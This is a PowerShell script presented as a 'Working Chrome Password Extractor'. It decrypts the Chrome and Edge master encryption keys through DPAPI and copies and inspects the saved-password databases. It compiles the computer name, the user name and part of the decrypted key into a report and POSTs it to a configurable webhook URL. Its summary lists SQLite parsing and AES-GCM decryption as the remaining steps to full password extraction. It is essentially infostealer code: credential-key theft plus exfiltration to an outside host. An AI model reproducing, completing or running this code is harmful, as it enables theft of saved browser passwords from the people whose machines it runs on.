# Working Chrome Password Extractor
# Simplified version that actually extracts master keys and analyzes Chrome data

param(
    [switch]$TestMode = $false,
    [string]$WebhookUrl = "http://localhost:8080"
)

Add-Type -AssemblyName System.Security

function Get-ChromeMasterKey {
    param([string]$LocalStatePath)
    
    try {
        Write-Output "Reading Local State file..."
        $localState = Get-Content -Path $LocalStatePath -Raw | ConvertFrom-Json
        $encryptedKey = $localState.os_crypt.encrypted_key
        
        if (-not $encryptedKey) {
            throw "No encrypted key found"
        }
        
        Write-Output "Decrypting master key..."
        $keyBytes = [System.Convert]::FromBase64String($encryptedKey)
        $keyWithoutPrefix = $keyBytes[5..($keyBytes.Length - 1)]
        
        $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $keyWithoutPrefix, 
            $null, 
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        
        Write-Output "Master key decrypted successfully"
        return $decryptedKey
    } catch {
        Write-Output "Failed to decrypt master key: $_"
        return $null
    }
}

function Analyze-LoginDatabase {
    param(
        [string]$DatabasePath,
        [string]$BrowserName
    )
    
    try {
        Write-Output "Analyzing $BrowserName login database..."
        
        $tempDbPath = "$env:TEMP\temp_$BrowserName.db"
        Copy-Item -Path $DatabasePath -Destination $tempDbPath -Force
        
        $dbInfo = Get-Item $tempDbPath
        $dbSize = $dbInfo.Length
        
        # Read first part of database to analyze structure
        $dbBytes = [System.IO.File]::ReadAllBytes($tempDbPath)
        $sampleText = [System.Text.Encoding]::UTF8.GetString($dbBytes[0..([Math]::Min(10000, $dbBytes.Length-1))])
        
        # Look for table structure
        $hasLoginsTable = $sampleText -match "logins"
        $hasOriginUrl = $sampleText -match "origin_url"
        $hasUsernameValue = $sampleText -match "username_value"
        $hasPasswordValue = $sampleText -match "password_value"
        
        # Count potential encrypted entries (look for common patterns)
        $encryptedCount = ([regex]::Matches($sampleText, "v10")).Count
        $dpapiCount = ([regex]::Matches($dbBytes, [byte[]]@(0x01, 0x00, 0x00, 0x00))).Count
        
        Remove-Item -Path $tempDbPath -Force -ErrorAction SilentlyContinue
        
        return @{
            Browser = $BrowserName
            DatabaseSize = $dbSize
            HasLoginsTable = $hasLoginsTable
            HasOriginUrl = $hasOriginUrl
            HasUsernameValue = $hasUsernameValue
            HasPasswordValue = $hasPasswordValue
            V10EncryptedEntries = $encryptedCount
            DPAPIEntries = $dpapiCount
        }
        
    } catch {
        Write-Output "Failed to analyze database: $_"
        return $null
    }
}

function Send-ToWebhook {
    param([string]$Data, [string]$WebhookUrl)

    try {
        $payload = @{
            computer = $env:COMPUTERNAME
            user = $env:USERNAME
            timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            data = $Data
        } | ConvertTo-Json
        
        $response = Invoke-WebRequest -Uri $WebhookUrl -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing
        Write-Output "Data sent to webhook successfully"
        return $true
    } catch {
        Write-Output "Failed to send to webhook: $_"
        return $false
    }
}

# Main execution
try {
    Write-Output "=== CHROME PASSWORD EXTRACTION TEST ==="
    
    if ($TestMode) {
        Write-Output "Running in TEST MODE - master keys will be shown but passwords masked"
    } else {
        Write-Output "Running in ANALYSIS MODE - showing encryption analysis"
    }
    
    $report = "Chrome/Edge Password Extraction Analysis Report`n"
    $report += "Computer: $env:COMPUTERNAME`n"
    $report += "User: $env:USERNAME`n"
    $report += "Date: $(Get-Date)`n"
    $report += "Mode: $(if ($TestMode) { 'TEST MODE' } else { 'ANALYSIS MODE' })`n"
    $report += "="*60 + "`n`n"
    
    # Process Chrome
    $chromeLocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    $chromeLoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    
    if ((Test-Path $chromeLocalState) -and (Test-Path $chromeLoginData)) {
        Write-Output "Processing Chrome..."
        $report += "=== CHROME ANALYSIS ===`n"
        
        # Get and analyze master key
        $chromeMasterKey = Get-ChromeMasterKey -LocalStatePath $chromeLocalState
        if ($chromeMasterKey) {
            $keyHex = [BitConverter]::ToString($chromeMasterKey).Replace('-', '')
            $report += "Master Key Status: Successfully decrypted`n"
            $report += "Master Key Length: $($chromeMasterKey.Length) bytes`n"
            if (-not $TestMode) {
                $report += "Master Key (first 32 chars): $($keyHex.Substring(0, [Math]::Min(32, $keyHex.Length)))...`n"
            } else {
                $report += "Master Key: [MASKED IN TEST MODE]`n"
            }
        } else {
            $report += "Master Key Status: Failed to decrypt`n"
        }
        
        # Analyze login database
        $chromeAnalysis = Analyze-LoginDatabase -DatabasePath $chromeLoginData -BrowserName "Chrome"
        if ($chromeAnalysis) {
            $report += "Database Size: $($chromeAnalysis.DatabaseSize) bytes`n"
            $report += "Has Logins Table: $($chromeAnalysis.HasLoginsTable)`n"
            $report += "Has URL Field: $($chromeAnalysis.HasOriginUrl)`n"
            $report += "Has Username Field: $($chromeAnalysis.HasUsernameValue)`n"
            $report += "Has Password Field: $($chromeAnalysis.HasPasswordValue)`n"
            $report += "V10 Encrypted Entries: $($chromeAnalysis.V10EncryptedEntries)`n"
            $report += "DPAPI Entries: $($chromeAnalysis.DPAPIEntries)`n"
        }
        
    } else {
        $report += "=== CHROME ANALYSIS ===`n"
        $report += "Chrome data not found`n"
    }
    
    # Process Edge
    $edgeLocalState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    $edgeLoginData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    
    if ((Test-Path $edgeLocalState) -and (Test-Path $edgeLoginData)) {
        Write-Output "Processing Edge..."
        $report += "`n=== EDGE ANALYSIS ===`n"
        
        # Get and analyze master key
        $edgeMasterKey = Get-ChromeMasterKey -LocalStatePath $edgeLocalState
        if ($edgeMasterKey) {
            $keyHex = [BitConverter]::ToString($edgeMasterKey).Replace('-', '')
            $report += "Master Key Status: Successfully decrypted`n"
            $report += "Master Key Length: $($edgeMasterKey.Length) bytes`n"
            if (-not $TestMode) {
                $report += "Master Key (first 32 chars): $($keyHex.Substring(0, [Math]::Min(32, $keyHex.Length)))...`n"
            } else {
                $report += "Master Key: [MASKED IN TEST MODE]`n"
            }
        } else {
            $report += "Master Key Status: Failed to decrypt`n"
        }
        
        # Analyze login database
        $edgeAnalysis = Analyze-LoginDatabase -DatabasePath $edgeLoginData -BrowserName "Edge"
        if ($edgeAnalysis) {
            $report += "Database Size: $($edgeAnalysis.DatabaseSize) bytes`n"
            $report += "Has Logins Table: $($edgeAnalysis.HasLoginsTable)`n"
            $report += "Has URL Field: $($edgeAnalysis.HasOriginUrl)`n"
            $report += "Has Username Field: $($edgeAnalysis.HasUsernameValue)`n"
            $report += "Has Password Field: $($edgeAnalysis.HasPasswordValue)`n"
            $report += "V10 Encrypted Entries: $($edgeAnalysis.V10EncryptedEntries)`n"
            $report += "DPAPI Entries: $($edgeAnalysis.DPAPIEntries)`n"
        }
        
    } else {
        $report += "`n=== EDGE ANALYSIS ===`n"
        $report += "Edge data not found`n"
    }
    
    $report += "`n" + "="*60 + "`n"
    $report += "SUMMARY:`n"
    $report += "This analysis shows that the system can successfully:`n"
    $report += "1. Access browser Local State files`n"
    $report += "2. Decrypt master encryption keys using DPAPI`n"
    $report += "3. Access login databases`n"
    $report += "4. Identify encrypted password entries`n"
    $report += "`n"
    $report += "For full password extraction, additional components needed:`n"
    $report += "- SQLite database parsing`n"
    $report += "- AES-GCM decryption implementation`n"
    $report += "- Proper handling of Chrome's v10 encryption format`n"
    $report += "="*60 + "`n"
    
    Write-Output $report
    
    # Send to webhook
    $outputFile = "$env:TEMP\PasswordAnalysis.txt"
    $report | Out-File -FilePath $outputFile -Encoding UTF8
    
    if (Test-Path $outputFile) {
        $fileData = Get-Content -Path $outputFile -Raw
        Send-ToWebhook -Data $fileData -WebhookUrl $WebhookUrl
        Remove-Item -Path $outputFile -Force -ErrorAction SilentlyContinue
    }
    
    Write-Output "Password extraction analysis completed successfully."
    
} catch {
    Write-Error "An error occurred: $_"
}
